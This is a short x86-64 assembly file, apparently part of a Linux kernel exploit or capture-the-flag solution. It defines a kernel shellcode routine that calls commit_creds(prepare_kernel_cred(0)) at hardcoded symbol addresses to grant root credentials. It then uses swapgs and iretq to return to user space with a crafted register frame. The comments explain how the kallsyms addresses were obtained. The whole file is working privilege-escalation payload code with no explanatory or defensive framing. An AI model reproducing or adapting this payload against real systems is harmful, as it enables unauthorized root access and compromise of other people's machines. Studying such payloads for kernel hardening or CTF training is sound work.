.text
.intel_syntax noprefix

.global kernel_shellcode

kernel_shellcode:
    # commit_creds(prepare_kernel_cred(0))
    xor rdi, rdi
    mov rax, 0xffffffff81052a60 # cat /proc/kallsyms | grep prepare_kernel_cred
    call rax
    mov rdi, rax
    mov rax, 0xffffffff81052830 # cat /proc/kallsyms | grep commit_creds
    call rax
context_switch:
    swapgs
    push 0x2b       # ss
    push 0xdead000  # rsp
    push 0x246      # rflags
    push 0x33       # cs
    push 0xbeef000  # rip
    iretq